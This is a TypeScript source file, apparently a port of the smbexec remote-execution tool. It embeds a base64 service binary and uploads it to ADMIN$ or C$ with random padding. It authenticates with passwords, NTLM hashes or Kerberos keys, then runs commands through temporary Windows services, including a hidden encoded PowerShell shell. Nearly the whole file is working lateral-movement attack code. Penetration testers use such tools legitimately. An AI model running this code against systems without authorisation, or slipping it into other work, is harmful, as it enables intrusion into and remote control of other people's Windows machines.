AAAAAAAAAAAAAAAAAAAAAAAAAAAAAjmk9+AAAAAEGFbDsAAAAAEAAAAAAAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAABDGAAAsDcAAEMYAADDGAAAzDcAAMMYAAAnGQAA1DcAACcZAABYGQAA3DcAAFgZAACeGgAA5DcAAJ4aAADtHAAA+DcAAO0cAAAJHQAAFDgAAAkdAAATHQAAHDgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';

// --------------------------------------------------------------------------
// RemoteShell -- semi-interactive shell via SCM service creation
// --------------------------------------------------------------------------

class RemoteShell {
  private share: string;
  private mode: string;
  private smbOutputFile = '';
  private outputBuffer: Buffer = Buffer.alloc(0);
  private shellType: string;
  private pwsh = 'powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc ';
  private binaryName: string;
  private binarySharePath: string;
  private binaryLocalPath: string;
  private cwd = '';
  private _serviceName: string;
  private rpc: SMBTransport;
  private scmr!: DCERPC_v5;
  private scHandle!: ScRpcHandle;
  private transferClient!: SMBConnection;
  private prompt = '';
  private codec: string;

  constructor(
    share: string,
    rpc: SMBTransport,
    mode: string,
    serviceName: string,
    shellType: string,
    codec: string,
  ) {
    this.share = share;
    this.mode = mode;
    this.shellType = shellType;
    this._serviceName = serviceName;
    this.rpc = rpc;
    this.codec = codec;

    this.binaryName = randomLetters(8) + '.exe';
    if (share.toUpperCase() === 'ADMIN$') {
      this.binarySharePath = `Temp\\${this.binaryName}`;
      this.binaryLocalPath = `%SYSTEMROOT%\\Temp\\${this.binaryName}`;
    } else if (share.toUpperCase() === 'C$') {
      this.binarySharePath = `Windows\\Temp\\${this.binaryName}`;
      this.binaryLocalPath = `C:\\Windows\\Temp\\${this.binaryName}`;
    } else {
      this.binarySharePath = this.binaryName;
      this.binaryLocalPath = `\\\\127.0.0.1\\${share}\\${this.binaryName}`;
    }
  }

  async init(): Promise<void> {
    this.scmr = this.rpc.getDceRpc();
    try {
      await this.scmr.connect();
    } catch (e) {
      critical(String(e));
      process.exit(1);
    }

    this.transferClient = this.rpc.getSmbConnection()!;
    const s = this.transferClient;
    s.setTimeout(100000);

    await this.scmr.bind(MSRPC_UUID_SCMR);
    const resp = await hROpenSCManagerW(this.scmr);
    this.scHandle = resp.get('lpScHandle') as ScRpcHandle;

    await this.uploadBinary();

    // Get the initial prompt by running 'cd'
    await this.executeRemote('cd');
    if (this.outputBuffer.length > 0) {
      this.cwd = this.outputBuffer.toString(this.codec as BufferEncoding).replace(/\r\n/g, '');
      this.prompt = this.cwd + '>';
      if (this.shellType === 'powershell') {
        this.prompt = 'PS ' + this.prompt + ' ';
      }
      this.outputBuffer = Buffer.alloc(0);
    }
  }

  async finish(): Promise<void> {
    // Clean up the output file and binary
    try {
      await this.transferClient.deleteFile(this.share, this.smbOutputFile);
    } catch {
      // ignore
    }
    try {
      await this.transferClient.deleteFile(this.share, this.binarySharePath);
    } catch {
      // ignore
    }

    // Clean up the service
    try {
      this.scmr = this.rpc.getDceRpc();
      await this.scmr.connect();
      await this.scmr.bind(MSRPC_UUID_SCMR);
      const resp = await hROpenSCManagerW(this.scmr);
      this.scHandle = resp.get('lpScHandle') as ScRpcHandle;
      const serviceResp = await hROpenServiceW(this.scmr, this.scHandle, this._serviceName);
      const service = serviceResp.get('lpServiceHandle') as ScRpcHandle;
      await hRDeleteService(this.scmr, service);
      try {
        await hRControlService(this.scmr, service, SERVICE_CONTROL_STOP);
      } catch {
        // ignore
      }
      await hRCloseServiceHandle(this.scmr, service);
    } catch {
      // ignore -- service may already be cleaned up
    }
  }

  private async getOutput(): Promise<void> {
    if (this.mode !== 'SHARE') return;

    const tid = await this.transferClient.connectTree(this.share);
    try {
      for (let attempt = 0; attempt < 10; attempt++) {
        await new Promise((r) => setTimeout(r, attempt === 0 ? 1500 : 1000));
        try {
          const fid = await this.transferClient.openFile(tid, this.smbOutputFile);
          let data: Buffer;
          try {
            data = await this.transferClient.readFile(tid, fid, 0, null, true);
          } catch (readErr: any) {
            const msg = String(readErr);
            if (msg.includes('0xc0000011')) {
              try { await this.transferClient.closeFile(tid, fid); } catch {}
              debug(`Output file empty, retrying (${attempt + 1}/10)...`);
              continue;
            }
            try { await this.transferClient.closeFile(tid, fid); } catch {}
            throw readErr;
          }
          await this.transferClient.closeFile(tid, fid);
          if (data.length > 0) {
            this.outputBuffer = Buffer.concat([this.outputBuffer, data]);
            break;
          }
          debug(`Output file empty, retrying (${attempt + 1}/10)...`);
        } catch (openErr: any) {
          const msg = String(openErr);
          if (msg.includes('0xc0000034') || msg.includes('0xc0000043')) {
            debug(`Output file not ready, retrying (${attempt + 1}/10)...`);
            continue;
          }
          throw openErr;
        }
      }
    } finally {
      try { await this.transferClient.deleteFile(this.share, this.smbOutputFile); } catch {}
      await this.transferClient.disconnectTree(tid);
    }
  }

  private async uploadBinary(): Promise<void> {
    const exeData = Buffer.from(SMBEXECSVC_EXE, 'base64');
    const pad = Buffer.alloc(64 + Math.floor(Math.random() * 192));
    for (let i = 0; i < pad.length; i++) pad[i] = Math.floor(Math.random() * 256);
    const payload = Buffer.concat([exeData, pad]);
    const tid = await this.transferClient.connectTree(this.share);
    try {
      const fid = await this.transferClient.createFile(tid, this.binarySharePath);
      await this.transferClient.writeFile(tid, fid, payload);
      await this.transferClient.closeFile(tid, fid);
    } finally {
      await this.transferClient.disconnectTree(tid);
    }
    debug(`Uploaded ${this.binaryName} (${payload.length} bytes)`);
  }

  private tempPath(name: string): { share: string; local: string } {
    if (this.share.toUpperCase() === 'ADMIN$') {
      return { share: `Temp\\${name}`, local: `%SYSTEMROOT%\\Temp\\${name}` };
    } else if (this.share.toUpperCase() === 'C$') {
      return { share: `Windows\\Temp\\${name}`, local: `C:\\Windows\\Temp\\${name}` };
    }
    return { share: name, local: `\\\\127.0.0.1\\${this.share}\\${name}` };
  }

  private async executeRemote(data: string, shellType = 'cmd'): Promise<void> {
    let cmdData = data;
    if (shellType === 'powershell') {
      cmdData = '$ProgressPreference="SilentlyContinue";' + cmdData;
      cmdData = this.pwsh + Buffer.from(cmdData, 'utf16le').toString('base64');
    }
    if (this.cwd) {
      cmdData = `cd /d ${this.cwd} && ${cmdData}`;
    }

    const cmdFile = this.tempPath(randomLetters(8));
    const outFile = this.tempPath(randomLetters(8));

    const tid = await this.transferClient.connectTree(this.share);
    try {
      const fid = await this.transferClient.createFile(tid, cmdFile.share);
      await this.transferClient.writeFile(tid, fid, Buffer.from(cmdData, 'utf-8'));
      await this.transferClient.closeFile(tid, fid);
    } finally {
      await this.transferClient.disconnectTree(tid);
    }

    const command = `${this.binaryLocalPath} ${cmdFile.local} ${outFile.local}`;
    debug(`Executing via svc binary: ${command}`);

    const resp = await hRCreateServiceW(
      this.scmr,
      this.scHandle,
      this._serviceName,
      this._serviceName,
      SERVICE_ALL_ACCESS,
      undefined,
      SERVICE_DEMAND_START,
      undefined,
      command,
    );
    const service = resp.get('lpServiceHandle') as ScRpcHandle;

    try {
      await hRStartServiceW(this.scmr, service);
    } catch (e) {
      debug(`Service start result: ${e}`);
    }

    await hRDeleteService(this.scmr, service);
    await hRCloseServiceHandle(this.scmr, service);

    this.smbOutputFile = outFile.share;
    await this.getOutput();
  }

  private async sendData(data: string): Promise<void> {
    await this.executeRemote(data, this.shellType);
    try {
      const output = this.outputBuffer.toString(this.codec as BufferEncoding);
      process.stdout.write(output);
    } catch {
      error(
        'Decoding error detected, consider running chcp.com at the target,\n' +
        'map the result with https://docs.python.org/3/library/codecs.html#standard-encodings\n' +
        'and then execute smbexec again with --codec and the corresponding codec',
      );
      process.stdout.write(this.outputBuffer.toString('utf-8'));
    }
    this.outputBuffer = Buffer.alloc(0);
  }

  async onecmd(cmd: string): Promise<void> {
    await this.executeRemote(cmd, this.shellType);
    try {
      const output = this.outputBuffer.toString(this.codec as BufferEncoding);
      process.stdout.write(output);
    } catch {
      process.stdout.write(this.outputBuffer.toString('utf-8'));
    }
    this.outputBuffer = Buffer.alloc(0);
  }

  async cmdloop(): Promise<void> {
    console.log('[!] Launching semi-interactive shell - Careful what you execute');

    const rl = createInterface({
      input: process.stdin,
      output: process.stdout,
      prompt: this.prompt,
    });

    rl.prompt();

    const processLine = async (line: string): Promise<void> => {
      const trimmed = line.trim();

      if (trimmed === 'exit' || trimmed === 'quit') {
        rl.close();
        return;
      }

      if (trimmed === 'EOF') {
        console.log();
        rl.close();
        return;
      }

      if (trimmed.toLowerCase().startsWith('cd ') || trimmed.toLowerCase() === 'cd') {
        const target = trimmed.slice(3).trim();
        if (target) {
          await this.executeRemote(`cd /d ${target} && cd`);
        } else {
          await this.executeRemote('cd');
        }
        if (this.outputBuffer.length > 0) {
          const resolved = this.outputBuffer.toString(this.codec as BufferEncoding).replace(/\r\n/g, '');
          this.cwd = resolved;
          this.prompt = resolved + '>';
          if (this.shellType === 'powershell') {
            this.prompt = 'PS ' + this.prompt + ' ';
          }
          this.outputBuffer = Buffer.alloc(0);
        }
        rl.setPrompt(this.prompt);
        return;
      }

      if (trimmed.startsWith('!')) {
        const { execSync } = await import('node:child_process');
        try {
          const result = execSync(trimmed.slice(1), { encoding: 'utf-8' });
          process.stdout.write(result);
        } catch (e) {
          error(String(e));
        }
        return;
      }

      if (trimmed !== '') {
        await this.sendData(trimmed);
      }
    };

    let isClosed = false;
    rl.on('close', () => { isClosed = true; });

    for await (const line of rl) {
      await processLine(line);
      if (isClosed) break;
      rl.prompt();
    }
  }
}

// --------------------------------------------------------------------------
// CMDEXEC class
// --------------------------------------------------------------------------

interface CMDEXECOptions {
  username?: string;
  password?: string;
  domain?: string;
  hashes?: string;
  aesKey?: string;
  doKerberos?: boolean;
  kdcHost?: string;
  mode?: string;
  share?: string;
  port?: number;
  serviceName?: string;
  shellType?: string;
  codec?: string;
  command?: string;
}

class CMDEXEC {
  private username: string;
  private password: string;
  private port: number;
  private domain: string;
  private lmhash: string;
  private nthash: string;
  private aesKey?: string;
  private doKerberos: boolean;
  private kdcHost?: string;
  private share: string;
  private mode: string;
  private shellType: string;
  private _serviceName: string;
  private codec: string;
  private command: string | undefined;
  private shell: RemoteShell | null = null;

  constructor(opts: CMDEXECOptions) {
    this.username = opts.username ?? '';
    this.password = opts.password ?? '';
    this.port = opts.port ?? 445;
    this.domain = opts.domain ?? '';
    this.lmhash = '';
    this.nthash = '';
    this.aesKey = opts.aesKey;
    this.doKerberos = opts.doKerberos ?? false;
    this.kdcHost = opts.kdcHost;
    this.share = opts.share ?? 'C$';
    this.mode = opts.mode ?? 'SHARE';
    this.shellType = opts.shellType ?? 'cmd';
    this.codec = opts.codec ?? 'utf-8';
    this.command = opts.command;
    if (opts.hashes) {
      const parts = opts.hashes.split(':');
      this.lmhash = parts[0] ?? '';
      this.nthash = parts[1] ?? '';
    }
    this._serviceName = opts.serviceName ?? randomLetters(8);
  }

  async run(remoteName: string, remoteHost: string): Promise<void> {
    const stringbinding = `ncacn_np:${remoteName}[\\pipe\\svcctl]`;
    debug(`StringBinding ${stringbinding}`);
    const rpctransport = DCERPCTransportFactory(stringbinding) as SMBTransport;
    rpctransport.setDport(this.port);
    rpctransport.setRemoteHost(remoteHost);
    rpctransport.setCredentials(
      this.username, this.password, this.domain,
      this.lmhash, this.nthash, this.aesKey ?? null,
    );
    rpctransport.setKerberos(this.doKerberos, this.kdcHost ?? null);

    try {
      this.shell = new RemoteShell(
        this.share,
        rpctransport,
        this.mode,
        this._serviceName,
        this.shellType,
        this.codec,
      );
      await this.shell.init();
      if (this.command) {
        await this.shell.onecmd(this.command);
      } else {
        await this.shell.cmdloop();
      }
    } catch (e) {
      critical(String(e));
      if (this.shell) {
        await this.shell.finish();
      }
      process.exit(1);
    } finally {
      if (this.shell) {
        await this.shell.finish();
      }
    }
  }
}

// --------------------------------------------------------------------------
// CLI argument parsing
// --------------------------------------------------------------------------

async function main(): Promise<void> {
  console.log(BANNER + '\n');

  let values: any;
  let positionals: string[];
  try {
    ({ values, positionals } = parseArgs({
      args: normalizeArgs(process.argv.slice(2)),
      allowPositionals: true,
      options: {
        share: { type: 'string', default: 'C$' },
        mode: { type: 'string', default: 'SHARE' },
        ts: { type: 'boolean', default: false },
        debug: { type: 'boolean', default: false },
        codec: { type: 'string' },
        'shell-type': { type: 'string', default: 'cmd' },
        'dc-ip': { type: 'string' },
        'target-ip': { type: 'string' },
        port: { type: 'string', default: '445' },
        'service-name': { type: 'string' },
        hashes: { type: 'string' },
        'no-pass': { type: 'boolean', default: false },
        k: { type: 'boolean', default: false },
        aesKey: { type: 'string' },
        keytab: { type: 'string' },
        execute: { type: 'string' },
        proxy: { type: 'string' },
        help: { type: 'boolean', short: 'h', default: false },
      },
    }));
  } catch (e) {
    console.error(`[-] ${(e as Error).message}`);
    process.exit(1);
  }

  if (values.help || positionals.length === 0) {
    console.log(`usage: smbexec [-h] [-share SHARE] [-mode {SHARE,SERVER}] [-ts] [-debug]
               [-codec CODEC] [-shell-type {cmd,powershell}]
               [-dc-ip ip address] [-target-ip ip address]
               [-port {139,445}] [-service-name service_name]
               [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]
               [-keytab KEYTAB]
               target

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>

options:
  -h, --help            show this help message and exit
  -share SHARE          share where the output will be grabbed from (default
                        C$)
  -mode {SHARE,SERVER}  mode to use (default SHARE, SERVER needs root!)
  -ts                   adds timestamp to every logging output
  -debug                Turn DEBUG output ON
  -codec CODEC          Sets encoding used (codec) from the target's output
                        (default "437")
  -shell-type {cmd,powershell}
                        choose a command processor for the semi-interactive
                        shell

connection:
  -dc-ip ip address     IP Address of the domain controller. If omitted it
                        will use the domain part (FQDN) specified in the
                        target parameter
  -target-ip ip address
                        IP Address of the target machine. If ommited it will
                        use whatever was specified as target
  -port {139,445}       Destination port to connect to SMB Server
  -service-name service_name
                        The name of the service used to trigger the payload

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from
                        ccache file (KRB5CCNAME) based on target parameters
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256
                        bits)
  -keytab KEYTAB        Read keys for SPN from keytab file
`);
    process.exit(positionals.length === 0 ? 1 : 0);
  }

  initProxy(values.proxy);
  initLogger({ ts: values.ts, debug: values.debug });

  const codec = values.codec ?? 'utf-8';

  const target = positionals[0]!;
  const [domain, username, password, remoteName] = parseTarget(target);

  const targetIp = values['target-ip'] ?? remoteName;

  if (
    password === '' &&
    username !== '' &&
    !values.hashes &&
    !values['no-pass'] &&
    !values.aesKey
  ) {
    critical('Password required. Use --hashes, --no-pass, or provide password in the target string.');
    process.exit(1);
  }

  let aesKey = values.aesKey ?? '';
  if (values.keytab) {
    const keys = loadKeytabKeys(values.keytab);
    if (keys.aesKey) aesKey = keys.aesKey;
    if (keys.nthash && !values.hashes) values.hashes = `:${keys.nthash}`;
  }
  const doKerberos = values.k || !!aesKey;

  const mode = values.mode?.toUpperCase() ?? 'SHARE';
  if (mode !== 'SHARE' && mode !== 'SERVER') {
    critical('Mode must be SHARE or SERVER');
    process.exit(1);
  }

  if (mode === 'SERVER') {
    critical('SERVER mode is not supported in the TypeScript port. Use SHARE mode.');
    process.exit(1);
  }

  try {
    const executer = new CMDEXEC({
      username,
      password,
      domain: domain || '',
      hashes: values.hashes,
      aesKey: aesKey || undefined,
      doKerberos,
      kdcHost: values['dc-ip'],
      mode,
      share: values.share,
      port: parseInt(values.port ?? '445', 10),
      serviceName: values['service-name'],
      shellType: values['shell-type'],
      codec,
      command: values.execute,
    });
    await executer.run(remoteName, targetIp);
  } catch (e) {
    critical(String(e));
  }
  process.exit(0);
}

main().catch((e) => {
  critical(String(e));
  process.exit(1);
});
